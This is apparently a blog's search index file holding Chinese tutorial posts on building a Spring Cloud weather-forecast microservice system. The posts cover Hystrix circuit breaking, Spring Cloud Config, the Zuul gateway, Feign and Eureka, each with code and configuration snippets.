<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[11.天气预报系统-熔断机制]]></title>
    <url>%2F2018%2F11%2F26%2F11.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E7%86%94%E6%96%AD%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[11.天气预报系统-熔断机制 一、定义保护系统的一种方式，当请求超出阈值，把真实的服务接口断开，可能只是返回给你一个默认值。这样，掐断了自己的服务，又可以给用户一个响应。 对该服务的调用执行熔断，对于后续请求，不再继续调用该目标服务，而是直接返回，从而可以快速释放资源。 熔断器好处：系统稳定、减少性能损耗、及时响应、阈值可配置 熔断这一概念来源于电子工程中的断路器（Circuit Breaker）。在互联网系统中，当下游服务因访问压力过大而响应变慢或失败，上游服务为了保护系统整体的可用性，可以暂时切断对下游服务的调用。 这种牺牲局部，保全整体的措施就叫做熔断。 如果不采取熔断措施，我们的系统会怎样呢？我们来看一个栗子。当前系统中有A，B，C三个服务，服务A是上游，服务B是中游，服务C是下游。它们的调用链如下： 一旦下游服务C因某些原因变得不可用，积压了大量请求，服务B的请求线程也随之阻塞。线程资源逐渐耗尽，使得服务B也变得不可用。紧接着，服务A也变为不可用，整个调用链路被拖垮。 像这种调用链路的连锁故障，叫做雪崩。 正所谓刮骨疗毒，壮士断腕。在这种时候，就需要我们的熔断机制来挽救整个系统。 开启熔断:在固定时间窗口内，接口调用超时比率达到一个阈值，会开启熔断。进入熔断状态后，后续对该服务接口的调用不再经过网络，直接执行本地的默认方法，达到服务降级的效果。 熔断恢复:熔断不可能是永久的。当经过了规定时间之后，服务将从熔断状态回复过来，再次接受调用方的远程调用。 二、熔断和降级 在股票市场，熔断这个词大家都不陌生，是指当股指波幅达到某个点后，交易所为控制风险采取的暂停交易措施。相应的，服务熔断一般是指软件系统中，由于某些原因使得服务出现了过载现象，为防止造成整个系统故障，从而采用的一种保护措施，所以很多地方把熔断亦称为过载保护。 大家都见过女生旅行吧，大号的旅行箱是必备物，平常走走近处绰绰有余，但一旦出个远门，再大的箱子都白搭了，怎么办呢？常见的情景就是把物品拿出来分分堆，比了又比，最后一些非必需品的就忍痛放下了，等到下次箱子够用了，再带上用一用。而服务降级，就是这么回事，整体资源快不够了，忍痛将某些服务先关掉，待渡过难关，再开启回来。 降级白话理解：比如在公司 遇到贵宾要来 就把一些不重要的常规接待暂停 把这些资源供给招待贵宾 之前有个淘宝的分享 比如双11 把订单评论和收藏等功能在这一天暂停 把这些资源分给其它关键服务 比如下单 所以从上述分析来看，两者其实从有些角度看是有一定的类似性的： 目的很一致，都是从可用性可靠性着想，为防止系统的整体缓慢甚至崩溃，采用的技术手段； 最终表现类似，对于两者来说，最终让用户体验到的是某些功能暂时不可达或不可用； 粒度一般都是服务级别，当然，业界也有不少更细粒度的做法，比如做到数据持久层（允许查询，不允许增删改）； 自治性要求很高，熔断模式一般都是服务基于策略的自动触发，降级虽说可人工干预，但在微服务架构下，完全靠人显然不可能，开关预置、配置中心都是必要手段； 而两者的区别也是明显的： 触发原因不太一样，服务熔断一般是某个服务（下游服务）故障引起，而服务降级一般是从整体负荷考虑； 管理目标的层次不太一样，熔断其实是一个框架级的处理，每个微服务都需要（无层级之分），而降级一般需要对业务有层级之分（比如降级一般是从最外围服务开始） 三、Spring Cloud HystrixSpring Cloud Hystrix是基于Netflix的开源框架Hystrix实现，该框架实现了服务熔断、线程隔离等一系列服务保护功能。对于熔断机制的实现，Hystrix设计了三种状态： 熔断关闭状态（Closed）：服务没有故障时，熔断器所处的状态，对调用方的调用不做任何限制。 熔断开启状态（Open）：在固定时间窗口内（Hystrix默认是10秒），接口调用出错比率达到一个阈值（Hystrix默认为50%），会进入熔断开启状态。进入熔断状态后，后续对该服务接口的调用不再经过网络，直接执行本地的fallback方法。 半熔断状态（Half-Open）：在进入熔断开启状态一段时间之后（Hystrix默认是5秒），熔断器会进入半熔断状态。所谓半熔断就是尝试恢复服务调用，允许有限的流量调用该服务，并监控调用成功率。如果成功率达到预期，则说明服务已恢复，进入熔断关闭状态；如果成功率仍旧很低，则重新进入熔断关闭状态。 集成Hystrix也是很简单的： demo的改造的基础是eureka-client-feign,将其改造为eureka-client-feign-hystrix 1、引入依赖： 12345&lt;!--Hystrix--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; 2、添加注解@EnableCircuitBreaker，启用Hystrix 12345678910@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients@EnableCircuitBreakerpublic class EurekaClientFeignApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaClientFeignApplication.class, args); &#125;&#125; 3、在controller方法上增加注解@HystrixCommand 12345678910111213141516@RestControllerpublic class TestController &#123; @Autowired private CityClient cityClient; @GetMapping("cities") @HystrixCommand(fallbackMethod = "defaultCities") public String getData()&#123; String res = cityClient.listCity(); return res; &#125; public String defaultCities()&#123; return "City Data Server is down!"; &#125;&#125; 4、测试 启动eureka和城市数据服务，再启动本服务，是正常的。 那么，我们将城市数据服务关闭，看看有没有返回我们指定的默认值。 四、改造本系统在demo中，用@HystrixCommand注解中的熔断时执行的方法来实现异常情况下的默认返回。现在我们要改造msa-weather-report-eureka-feign-gateway，将其改造为msa-weather-report-eureka-feign-gateway-hystrix，我们用新的方式，直接在DataClient这个接口里面声明触发熔断时回调的类DataClientFallback.class。 123456789101112131415@FeignClient(name = "msa-eureka-client-zuul",fallback = DataClientFallback.class)public interface DataClient &#123; /** * 获取城市列表 */ @RequestMapping("city/cities") List&lt;City&gt; listCity() throws Exception; /** * 根据城市ID获取天气 */ @RequestMapping("data/weather/cityId/&#123;cityId&#125;") WeatherResponse getDataByCityId(@PathVariable("cityId") String cityId);&#125; 具体这个回调的类里面时这样写的：123456789101112131415161718@Componentpublic class DataClientFallback implements DataClient &#123; @Override public List&lt;City&gt; listCity() throws Exception &#123; List&lt;City&gt; cityList = new ArrayList&lt;&gt;(); City city = new City(); city.setCityId(&quot;101190101&quot;); city.setCityName(&quot;默认的南京&quot;); cityList.add(city); return cityList; &#125; @Override public WeatherResponse getDataByCityId(String cityId) &#123; return null; &#125;&#125; 也就是说，如果城市数据服务挂了，就默认返回一下我这里设置的城市；如果获取天气信息的服务挂了，我们就直接返回null; 那么，我们就相当于在feign中启用hystrix，就需要在配置文件中增加配置： 123feign: hystrix: enabled: true 因为如果根据城市id获取天气信息的服务不可用时，我们默认直接返回null，显示页面啥都不显示时不好的，所以我们需要在前端判断一下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!--不为空时--&gt;&lt;div th:if="$&#123;reportModel.report&#125; != null"&gt; &lt;div class="row"&gt; &lt;h1 class="text-success" th:text="$&#123;reportModel.report.city&#125;"&gt;城市名称&lt;/h1&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 空气质量指数：&lt;span th:text="$&#123;reportModel.report.aqi&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 当前温度：&lt;span th:text="$&#123;reportModel.report.wendu&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 温馨提示：&lt;span th:text="$&#123;reportModel.report.ganmao&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;div class="card border-info" th:each="forecast : $&#123;reportModel.report.forecast&#125;"&gt; &lt;div class="card-body text-info"&gt; &lt;p class="card-text" th:text="$&#123;forecast.date&#125;"&gt;日期&lt;/p&gt; &lt;p class="card-text " th:text="$&#123;forecast.type&#125;"&gt;天气类型&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.high&#125;"&gt;最高温度&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.low&#125;"&gt;最低温度&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.fengxiang&#125;"&gt;风向&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;!--为空时，说明熔断器生效，直接显示提示信息--&gt;&lt;div th:if="$&#123;reportModel.report&#125; == null"&gt; &lt;div class="row"&gt; &lt;p&gt; 天气数据API服务暂不可用！ &lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 下面就来测试一把吧！ 首先时完全正常的情况，各个服务都可用： 启动如下服务：redis,weather-sureka-server,msa-weather-city-eureka,msa-weather-collection-eureka-feign-gateway,msa-weather-data-eureka,msa-weather-report-eureka-feign-gateway-hystrix,msa-eureka-client-zuul这六个服务： 正常的话，就会看到之前的页面：http://localhost:8083/report/cityId/101190101 城市数据服务不可用，熔断器生效： 关闭城市数据服务msa-weather-city-eureka，造成服务不可用的现象。看页面显示是否只有我塞进去的假数据。 天气数据服务不可用，熔断器生效： 关闭天气数据API服务msa-weather-data-eureka.看页面是否显示服务暂不可用的提示信息。 报了一个空指针错误，原因是msa-weather-report-eureka-feign-gateway-hystrix中WeatherReportServiceImpl中的方法原来是这样写的： 1234567891011@Service@Slf4jpublic class WeatherReportServiceImpl implements IWeatherReportService &#123; @Autowired private WeatherClient weatherClient; @Override public Weather getDataByCityId(String cityId) &#123; return weatherClient.getDataByCityId(cityId).getData(); &#125;&#125; 显然，要做一下判空操作，否则是不能调用getData()这个方法的。 12345678910111213141516@Service@Slf4jpublic class WeatherReportServiceImpl implements IWeatherReportService &#123; @Autowired private DataClient dataClient; @Override public Weather getDataByCityId(String cityId) &#123; WeatherResponse res = dataClient.getDataByCityId(cityId); Weather weather = null; if(res != null)&#123; weather = res.getData(); &#125; return weather; &#125;&#125; 这样子，重新启动天气预报UI服务。就可以看到效果啦！ 这样，本系统集成hystrix就成功了。]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.天气预报系统-集中化配置]]></title>
    <url>%2F2018%2F11%2F25%2F10.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E9%9B%86%E4%B8%AD%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[天气预报系统-集中化配置 一、背景随着线上项目变的日益庞大，每个项目都散落着各种配置文件，如果采用分布式的开发模式，需要的配置文件随着服务增加而不断增多。某一个基础服务信息变更，都会引起一系列的更新和重启，运维苦不堪言也容易出错。配置中心便是解决此类问题的灵丹妙药。 我们需要一个外部的、集中化的一个配置中心。 二、配置分类 按配置的来源划分 主要有源代码、文件、数据库连接、远程调用等 按配置的环境划分 主要有开发环境、测试环境、预发布环境、生产环境等。 按配置的集成阶段划分 编译时、打包时和运行时 按配置的加载方式划分 启动加载和动态加载 三、Spring Cloud Config在我们了解spring cloud config之前，我可以想想一个配置中心提供的核心功能应该有什么 提供服务端和客户端支持 集中管理各环境的配置文件 配置文件修改之后，可以快速的生效 可以进行版本管理 支持大的并发查询 支持各种语言 Spring Cloud Config可以完美的支持以上所有的需求。 Spring Cloud Config项目是一个解决分布式系统的配置管理方案。它包含了Client和Server两个部分，server提供配置文件的存储、以接口的形式将配置文件的内容提供出去，client通过接口获取数据、并依据此数据初始化自己的应用。Spring cloud使用git或svn存放配置文件，默认情况下使用git. Server端注册到eureka的实例名：weather-config-server 1、添加依赖 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2、配置文件 1234567891011121314151617spring: application: name: weather-config-server cloud: config: server: git: uri: https://github.com/sunweiguo/spring-cloud-config-center search-paths: config-repo username: sunweiguo password: xxxeureka: client: service-url: defaultZone: http://localhost:8761/eurekaserver: port: 8086 config-repo这个文件夹是由自己在github上创建的。在这个目录下新建一个文件：weather-config-client-dev.properties,里面的内容为auther=oursnail.cn(随便写点东西以供测试) 仓库中的配置文件会被转换成web接口，访问可以参照以下的规则： /{application}/{profile}[/{label}] /{application}-{profile}.yml /{label}/{application}-{profile}.yml /{application}-{profile}.properties /{label}/{application}-{profile}.properties 我这里的weather-config-client-dev.properties,它的application是weather-config-client，profile是dev。client会根据填写的参数来选择读取对应的配置。 3、启动类 启动类添加@EnableConfigServer，激活对配置中心的支持 123456789@SpringBootApplication@EnableDiscoveryClient@EnableConfigServerpublic class WeatherEurekaClientApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(WeatherEurekaClientApplication.class, args); &#125;&#125; 到此server端相关配置已经完成 4、测试 访问 http://localhost:8086/auther/dev 返回： 12345678910&#123;&quot;name&quot;: &quot;auther&quot;,&quot;profiles&quot;: [&quot;dev&quot;],&quot;label&quot;: null,&quot;version&quot;: &quot;ef1a6baeddce01d3956ba2a7181f66721959a10c&quot;,&quot;state&quot;: null,&quot;propertySources&quot;: []&#125; 我们可以读到auther里的内容，说明服务端配置成功。 四、Client端注册到eureka的实例名：weather-config-client 1、添加依赖 123456789101112131415&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2、配置文件 需要配置两个配置文件，application.properties和bootstrap.properties application.properties如下： 1234spring.application.name=weather-config-clientserver.port=8087eureka.client.service-url.defaultZone: http://localhost:8761/eureka bootstrap.properties如下： 1234spring.cloud.config.name=weather-config-clientspring.cloud.config.profile=devspring.cloud.config.uri=http://localhost:8086/spring.cloud.config.label=master spring.application.name：对应{application}部分 spring.cloud.config.profile：对应{profile}部分 spring.cloud.config.label：对应git的分支。如果配置中心使用的是本地存储，则该参数无用 spring.cloud.config.uri：配置中心的具体地址,就是server端地址 特别注意：上面这些与spring-cloud相关的属性必须配置在bootstrap.properties中，config部分内容才能被正确加载。因为config的相关配置会先于application.properties，而bootstrap.properties的加载也是先于application.properties。 测试： 123456789101112@RunWith(SpringRunner.class)@SpringBootTestpublic class WeatherEurekaClientApplicationTests &#123; @Value("$&#123;auther&#125;") private String auther; @Test public void contextLoads() &#123; Assert.assertEquals("oursnail.cn",auther); &#125;&#125; 如果测试通过，那么获取内容成功。 但是我们通过网页的方式进行测试，我们会发现修改了github上的内容后，网页上的内容是不能立即刷新的。这比较头疼，可以通过一些途径去解决。 12345678910@RestControllerpublic class HelloController &#123; @Value("$&#123;auther&#125;") private String auther; @GetMapping("/hello") public String hello()&#123; return auther; &#125;&#125;]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.天气预报系统-API网关]]></title>
    <url>%2F2018%2F11%2F25%2F9.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-API%E7%BD%91%E5%85%B3%2F</url>
    <content type="text"><![CDATA[天气预报系统-API网关 一、背景理论上，客户端可以直接向微服务发送请求，每个微服务都有一个公开的URL，该URL将映射到微服务的负载均衡器，由它负责在可用实例之间分发请求。 但是我们知道在微服务架构风格中，一个大应用被拆分成为了多个小的服务系统提供出来，这些小的系统他们可以自成体系，也就是说这些小系统可以拥有自己的数据库，框架甚至语言等，这些小系统通常以提供 Rest Api 风格的接口来被 H5, Android, IOS 以及第三方应用程序调用。 但是在UI上进行展示的时候，我们通常需要在一个界面上展示很多数据，这些数据可能来自于不同的微服务中，举个例子。 在一个电商系统中，查看一个商品详情页，这个商品详情页包含商品的标题，价格，库存，评论等，这些数据对于后端来说可能是位于不同的微服务系统之中，可能我后台的系统是这样来拆分我的服务的： 产品服务 - 负责提供商品的标题，描述，规格等。价格服务 - 负责对产品进行定价，价格策略计算，促销价等。库存服务 - 负责产品库存。评价服务 - 负责用户对商品的评论，回复等。现在，商品详情页需要从这些微服务中拉取相应的信息，问题来了: 由于我们使用的服务系统架构，所以没办法像传统单体应用一样依靠数据库的 join 查询来得到最终结果，那么如何才能访问各个服务呢？这里就会引出以下几个问题： 1. 客户端需求和微服务暴露的细粒度 API 不匹配经常有一个业务调用很多个服务，假如客户端发送许多请求，这在公网上可能会很低效，而且会使客户端代码变得更复杂。 2. 服务使用的协议不是 Web 友好的有的服务可能使用二进制 RPC（比如 thrift），有的服务可能使用 AMQP 消息传递协议。不管哪种协议都不是浏览器友好或防火墙友好的，最好是内部使用。在防火墙之外，应用程序应该使用诸如 HTTP 和 WebSocket 之类的协议。 3. 难重构随着时间推移可能想要更改系统划分成服务的方式。例如，合并两个服务或者将一个服务拆分成两个或更多服务。如果客户端与微服务直接通信，那么执行这类重构就很困难。 由于以上问题，客户端与微服务直接通信很少是合理的，更好的方法是使用 API 网关，由 API 网关作为后端服务系统的唯一入口。它封装了系统内部架构，为每个客户端提供一个定制的 API 。由它负责服务请求路由、组合及协议转换。有的 API 网关还有其它职责，如身份验证、监控、负载均衡、缓存等。 二、API 网关 API网关是一个服务器，是系统的唯一入口。从面向对象设计的角度看，它与外观模式类似。API网关封装了系统内部架构，为每个客户端提供一个定制的API。它可能还具有其它职责，如身份验证、监控、负载均衡、缓存、请求分片与管理、静态响应处理。API网关方式的核心要点是，所有的客户端和消费端都通过统一的网关接入微服务，在网关层处理所有的非业务功能。通常，网关也是提供REST/HTTP的访问API。服务端通过API-GW注册和管理服务。 单节点网关 Backends for frontends 网关 三、API 网关的优缺点1. 优点封装了应用程序的内部结构。客户端只需要同网关交互，而不必调用特定的服务（统一API入口）。API 网关为每一类客户端提供了特定的 API ，从而减少客户端与应用程序间的交互次数，简化客户端代码的处理（集合多个API）。 另外，可以避免内部信息泄露给外部。可以为微服务添加额外的安全层。支持混合通信协议。降低构建微服务的复杂性。 2. 缺点增加了一个必须开发、部署和维护的高可用组件。还有一个风险是 API 网关变成了开发瓶颈。为了暴露每个微服务，开发人员必须更新 API 网关。API 网关的更新过程要尽可能地简单，否则为了更新网关，开发人员将不得不排队等待。不过，虽然有这些不足，但对于大多数现实世界的应用程序而言使用 API 网关是合理的。（在架构上需要额外考虑更多编排和管理；路由逻辑配置要进行统一的管理；可能引发单点故障） 四、参考实现方案以上列出在 DIY 这个 API 网关时需要考虑的点，以及参考的技术实现。下面是几种目前比较流行的 API 网关搭建的技术方案供参考，后续文章将给出这些方案搭建的例子 1）Nginx + Lua实现负载均衡、限流、服务发现等功能 2）使用 spring cloud 技术栈，其中 zuul 就是用作 API 网关的 3）Mashape 的开源 API 网关 Kong 本次，使用zuul作为API网关。 五、Zuul功能：认证、压测、金丝雀测试、动态路由、负载削减、安全、静态相应处理… 注意：因为我到目前为止，springboot用的版本是2.1.x，但是呢，集成zuul的时候报错，查了一下，是zuul还不支持2.1.x的版本，所以我将demo:weather-eureka-client=zuul降级到了2.0.3版本。启动成功并且测试成功 首先是准备拿出之前的两个项目：weather-eureka-server和weather-eureka-client，启动，一个地址是8671，一个地址我设定为8081,基于weather-eureka-client新建一个项目：weather-eureka-client-zuul，改动如下： 首先将springboot版本降到2.0.x版本。在启动类上增加注解：@EnableZuulProxy，在yml文件中新增： 12345zuul: routes: hi: path: /hi/** serviceId: weather-eureka-client 这里的含义是：定义一个名字叫做hi的路由规则（自定义），我们访问/hi/**这个路径的时候，就会转发到weather-eureka-client这个服务下的**路径。 比如我这里的weather-eureka-client有一个controller路径为”hello”，调用localhost:8081/hello就可以返回一个字符串。那么有了zuul配置之后，我可以访问localhost:8082/hi/hello也可以访问到这个路径了。 改造本系统： 新建一个项目：msa-eureka-client-zuul。主要是定义网关的路由。 12345678910111213141516171819spring: application: name: msa-eureka-client-zuuleureka: client: service-url: defaultZone: http://localhost:8761/eureka# 一个是msa-weather-data-eureka，一个是msa-weather-ciy-eurekazuul: routes: city: path: /city/**/ serviceId: msa-weather-city-eureka data: path: /data/**/ serviceId: msa-weather-data-eurekaserver: port: 8085 ok，下面我们就修改msa-weather-collection-cureka-feign和msa-weather-eporteign.复制为新的项目：msa-weather-collection-cureka-feign-zuul和msa-weather-eporteign-zuul 以msa-weather-eporteign-zuul为例，其实他依托于两个服务:msa-weather-data-eureka和msa-weather-ciy-eureka，这两个我们只需要写在一个接口内，调用网关里定义的路由即可： 12345678910111213141516@FeignClient("msa-eureka-client-zuul")public interface DataClient &#123; /** * 获取城市列表 */ @RequestMapping("city/cities") List&lt;City&gt; listCity() throws Exception; /** * 根据城市ID获取天气 */ @RequestMapping("data/weather/cityId/&#123;cityId&#125;") WeatherResponse getDataByCityId(@PathVariable("cityId") String cityId);&#125; 这样子，这个DataClient就取代了之前的cityClient和WeatherClient。改造完成。 测试无问题。]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.天气预报系统-微服务的消费]]></title>
    <url>%2F2018%2F11%2F23%2F8.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B6%88%E8%B4%B9%2F</url>
    <content type="text"><![CDATA[天气预报系统-微服务的消费 # 1.发现模式直连模式： 直接去连接某个url，比较简单粗暴，但是不能实现负载均衡和高可用，使用比较少。 客户端发现模式： 服务实例启动后，将自己的位置信息提交到服务注册表 客户端从服务注册表进行查询，来获取可用的服务实例 客户端自行使用负载均衡算法从多个服务实例中选择一个 服务端发现模式： 负载均衡的实现在服务端。而客户端发现模式的负载均衡由客户端来实现。 # 1.服务的消费者Apache HttpClient：这个比较简单，不再赘述。 Ribbon: 基于客户端负载均衡工具。可以基于Http或者Tcp实现负载均衡。 直接根据服务的名字来消费，具体是连到哪一个具体的ip去消费是不用管的，因为他已经在客户端上做了一定的负载均衡算法，由他的算法来决定。 Febin: Feign是一个声明式的伪Http客户端，它使得写Http客户端变得更简单。使用Feign，只需要创建一个接口并注解。它具有可插拔的注解特性，可使用Feign 注解和JAX-RS注解。Feign支持可插拔的编码器和解码器。Feign默认集成了Ribbon，并和Eureka结合，默认实现了负载均衡的效果。 我们先来搞个demo测试一把！ # 3.Demo for Feign首先，我们之前的工作中已经由了一个Eureka server，再拿一个叫做msa-weather-city-server的服务来测试。这个服务的主要功能是获取城市信息。 ## 3.1 引入依赖、添加注解首先引入feign依赖，注意这里有个坑，我一开始没有指定版本号，死活无法导入@EnableFeignClients这个注解： 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;version&gt;2.0.1.RELEASE&lt;/version&gt;&lt;/dependency&gt; 在程序的启动类ServiceFeignApplication ，加上@EnableFeignClients注解开启Feign的功能： 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class EurekaClientFeignApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaClientFeignApplication.class, args); &#125;&#125; ## 3.2 配置文件1234567891011121314spring: application: name: eureka-weather-feigneureka: client: service-url: defaultZone: http://localhost:8761/eurekafeign: client: config: feignName: connectTimeout: 5000 readTimeout: 5000 ## 3.3 定义feign接口定义一个feign接口，通过@ FeignClient（“服务名”），来指定调用哪个服务。比如在代码中调用了msa-weather-city-eureka服务的“/cities”接口来获取所有的城市列表，代码如下： 12345@FeignClient("msa-weather-city-eureka")public interface CityClient &#123; @GetMapping("/cities") String listCity();&#125; ## 3.4 定义API来供浏览器调用12345678910@RestControllerpublic class TestController &#123; @Autowired private CityClient cityClient; @GetMapping("cities") public String getData()&#123; String res = cityClient.listCity(); return res; &#125;&#125; 这样，启动服务中心Eureka server和服务提供方msa-weather-city-server以及本消费服务。再浏览器中访问对应的url：http://localhost:8080/cities就可以调用到`msa-weather-city-server`提供的服务。 至此，demo演示完毕。 # 4.用Feign继续完善天气项目有三个TODO项： 数据采集微服务在天气数据同步任务中，依赖于城市数据API微服务 天气预报微服务查询天气信息，依赖于天气数据API微服务 天气预报微服务提供的城市列表，依赖于城市数据API微服务 那么我们可以看出来，需要去集成Feign去消费的微服务只有两个：msa-weather-collection-eureka和msa-weather-report-eureka。我们将其改造为：msa-weather-collection-eureka-feign和msa-weather-report-eureka-feign. 这里就以msa-weather-collection-eureka为例，步骤基本与demo一样。首先是引入依赖，然后加上注解开启Feign功能。新建一个接口，还是获取城市列表。我只要指定好那个城市列表的微服务的名字和路径，就可以获取到了。不清楚直接看代码即可。 那么在全部改好之后，我们启动这五个项目。但是我们要注意，先启动weather-eureka-server，来提供注册的服务。然后启动城市数据服务，因为天气数据采集要用到他。然后启动天气数据采集服务。然后一次启动天气数据API服务和天气预报UI显示服务。 那么我们访问天气预报UI对应的URL,以南京为例：http://localhost:8083/report/cityId/101190101，如果功能是正常的，标识微服务改造初步成功。]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7.天气预报系统-微服务的注册和发现]]></title>
    <url>%2F2018%2F11%2F23%2F7.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B3%A8%E5%86%8C%E5%92%8C%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[天气预报系统-微服务的注册和发现 1.什么是spring cloudSpring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。Spring并没有重复制造轮子，它只是将目前各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。 微服务是可以独立部署、水平扩展、独立访问（或者有独立的数据库）的服务单元，spring cloud就是这些微服务的大管家，采用了微服务这种架构之后，项目的数量会非常多，spring cloud做为大管家需要管理好这些微服务，自然需要很多小弟来帮忙。 解决了分布式系统中的一些问题:配置管理、服务注册、服务发现、断路器、智能路由、负载均衡、服务间调用、一次性令牌、全局锁、领导选举、控制总线、思维导图、分布式会话、集群状态、分布式消息。。。 2.spring cloud &amp; spring boot SpringBoot是构建spring cloud架构的基石 3.spring cloud子项目参考这篇文章：springcloud(一)：大话Spring Cloud 4.Eureka4.1.服务中心服务中心又称注册中心，管理各种服务功能包括服务的注册、发现、熔断、负载、降级等，比如dubbo admin后台的各种功能。 有了服务中心调用关系会有什么变化，画几个简图来帮忙理解. 项目A调用项目B 12graph LR项目A--&gt;项目B 有了服务中心之后，任何一个服务都不能直接去掉用，都需要通过服务中心来调用 12graph LR项目A--&gt;注册中心再去访问项目B 由于各种服务都注册到了服务中心，就有了去做很多高级功能条件。比如几台服务提供相同服务来做均衡负载；监控服务器调用成功率来做熔断，移除服务列表中的故障点；监控服务调用时间来对不同的服务器设置不同的权重等等。 4.2.Eureka Spring Cloud 封装了 Netflix 公司开发的 Eureka 模块来实现服务注册和发现。 Eureka Server 作为服务注册功能的服务器，它是服务注册中心。而系统中的其他微服务，使用 Eureka 的客户端连接到 Eureka Server，并维持心跳连接。 这样系统的维护人员就可以通过 Eureka Server 来监控系统中各个微服务是否正常运行。 Spring Cloud 的一些其他模块（比如Zuul）就可以通过 Eureka Server 来发现系统中的其他微服务，并执行相关的逻辑。 Eureka由两个组件组成：Eureka服务器和Eureka客户端。Eureka服务器用作服务注册服务器。Eureka客户端是一个java客户端，用来简化与服务器的交互、作为轮询负载均衡器，并提供服务的故障切换支持。 其中有三个角色： Eureka Server：提供服务注册和发现 Service Provider服务提供方，将自身服务注册到Eureka，从而使服务消费方能够找到 Service Consumer：服务消费方，从Eureka获取注册服务列表，从而能够消费服务 4.3.Eureka Server新建一个springboot项目。spring cloud已经帮我实现了服务注册中心，我们只需要很简单的几个步骤就可以完成。 演示的springboot版本是最新的&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;,springcloud也是最新的&lt;version&gt;Finchley.RELEASE&lt;/version&gt; 1、pom中添加依赖 12345678910111213141516171819202122232425262728293031&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--Eureka server--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 